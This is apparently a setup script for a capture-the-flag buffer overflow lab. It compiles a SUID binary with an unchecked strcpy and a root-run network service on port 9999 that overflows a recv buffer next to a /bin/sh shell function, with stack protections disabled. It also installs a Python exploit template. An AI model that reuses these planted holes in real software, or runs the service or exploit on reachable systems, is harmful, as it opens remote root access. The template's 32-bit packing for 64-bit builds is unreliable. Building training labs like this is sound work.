#!/bin/bash
# setup_buffer_overflow.sh

echo "[+] Setting up Buffer Overflow scenario..."

# Install required packages
sudo apt-get update -qq
sudo apt-get install -y gcc gdb python3 python3-pip

# Create flag
echo "APTL{buff3r_0v3rfl0w_m4st3r}" | sudo tee /root/flag.txt > /dev/null
sudo chmod 600 /root/flag.txt

# Create vulnerable C program
cat << 'EOF' > /tmp/vulnerable_service.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void print_flag() {
    FILE *fp = fopen("/root/flag.txt", "r");
    if (fp != NULL) {
        char flag[100];
        fgets(flag, sizeof(flag), fp);
        printf("Congratulations! Flag: %s\n", flag);
        fclose(fp);
    } else {
        printf("Flag file not accessible.\n");
    }
}

void vulnerable_function(char *input) {
    char buffer[64];
    printf("Input received: ");
    strcpy(buffer, input);  // Vulnerable strcpy!
    printf("%s\n", buffer);
    printf("Buffer address: %p\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        printf("Buffer overflow challenge - can you call print_flag()?\n");
        printf("print_flag() is at: %p\n", print_flag);
        return 1;
    }
    
    printf("Welcome to the buffer overflow challenge!\n");
    printf("Your goal is to call the print_flag() function.\n");
    
    vulnerable_function(argv[1]);
    
    printf("Program completed normally.\n");
    return 0;
}
EOF

# Compile with specific flags for exploitation
gcc -fno-stack-protector -z execstack -no-pie /tmp/vulnerable_service.c -o /usr/local/bin/vuln_service
sudo chown root:root /usr/local/bin/vuln_service
sudo chmod 4755 /usr/local/bin/vuln_service  # SUID for flag access

# Create a more complex service version
cat << 'EOF' > /tmp/network_service.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void shell() {
    system("/bin/sh");
}

void handle_client(int client_socket) {
    char buffer[256];
    char response[512];
    
    send(client_socket, "Enter your name: ", 17, 0);
    
    int bytes_received = recv(client_socket, buffer, 512, 0);  // Overflow here!
    buffer[bytes_received] = '\0';
    
    snprintf(response, sizeof(response), "Hello %s!\n", buffer);
    send(client_socket, response, strlen(response), 0);
    
    close(client_socket);
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    
    printf("Buffer overflow network service starting...\n");
    printf("shell() function at: %p\n", shell);
    
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("Socket creation failed");
        exit(1);
    }
    
    int opt = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(9999);
    
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        exit(1);
    }
    
    if (listen(server_socket, 5) < 0) {
        perror("Listen failed");
        exit(1);
    }
    
    printf("Server listening on port 9999...\n");
    
    while (1) {
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (client_socket < 0) {
            perror("Accept failed");
            continue;
        }
        
        printf("Client connected from %s\n", inet_ntoa(client_addr.sin_addr));
        handle_client(client_socket);
    }
    
    close(server_socket);
    return 0;
}
EOF

# Compile network service
gcc -fno-stack-protector -z execstack -no-pie /tmp/network_service.c -o /usr/local/bin/network_vuln
sudo chown root:root /usr/local/bin/network_vuln
sudo chmod 755 /usr/local/bin/network_vuln

# Create systemd service for network vulnerability
cat << 'EOF' | sudo tee /etc/systemd/system/vuln-network.service > /dev/null
[Unit]
Description=Vulnerable Network Service for CTF
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/network_vuln
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
sudo systemctl daemon-reload
sudo systemctl enable vuln-network.service
sudo systemctl start vuln-network.service

# Create exploit development directory
mkdir -p /home/$(whoami)/exploit_dev
cat << 'EOF' > /home/$(whoami)/exploit_dev/exploit_template.py
#!/usr/bin/env python3
import struct
import socket
import sys

def p32(value):
    """Pack 32-bit integer as little-endian"""
    return struct.pack('<I', value)

def exploit_local():
    """Exploit the local SUID binary"""
    # Buffer size is 64 bytes
    # Need to find offset to return address
    buffer_size = 64
    padding = b'A' * buffer_size
    
    # Address of print_flag function (update with actual address)
    # Get this from: ./vuln_service test
    print_flag_addr = 0x00000000  # UPDATE THIS
    
    payload = padding + b'B' * 12 + p32(print_flag_addr)
    
    print(f"[+] Payload length: {len(payload)}")
    print(f"[+] Payload: {payload}")
    
    return payload

def exploit_network(target_ip="127.0.0.1", target_port=9999):
    """Exploit the network service"""
    buffer_size = 256
    padding = b'A' * buffer_size
    
    # Address of shell function (get from server output)
    shell_addr = 0x00000000  # UPDATE THIS
    
    payload = padding + b'B' * 12 + p32(shell_addr)
    
    print(f"[+] Connecting to {target_ip}:{target_port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    # Receive banner
    data = sock.recv(1024)
    print(f"[+] Received: {data.decode()}")
    
    # Send exploit payload
    print(f"[+] Sending payload...")
    sock.send(payload)
    
    # Check for shell
    sock.settimeout(2)
    try:
        response = sock.recv(1024)
        print(f"[+] Response: {response.decode()}")
    except:
        pass
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "network":
        exploit_network()
    else:
        payload = exploit_local()
        print("[+] To test locally:")
        print(f"./vuln_service $(python3 -c \"print('{payload.decode('latin-1')}')\")") 
EOF

chmod +x /home/$(whoami)/exploit_dev/exploit_template.py

# Clean up source files
rm /tmp/vulnerable_service.c /tmp/network_service.c

echo "[+] Buffer Overflow scenario deployed!"
echo "[+] Local binary: /usr/local/bin/vuln_service"
echo "[+] Network service: port 9999"
echo "[+] Exploit template: ~/exploit_dev/exploit_template.py"
echo "[+] Flag: /root/flag.txt"
echo ""
echo "[+] Quick start:"
echo "    1. Find print_flag address: /usr/local/bin/vuln_service test"
echo "    2. Calculate buffer offset with pattern_create/pattern_offset"
echo "    3. Build exploit payload"
echo "    4. Test: ./vuln_service \$(python3 -c \"print('A'*76 + address)\")"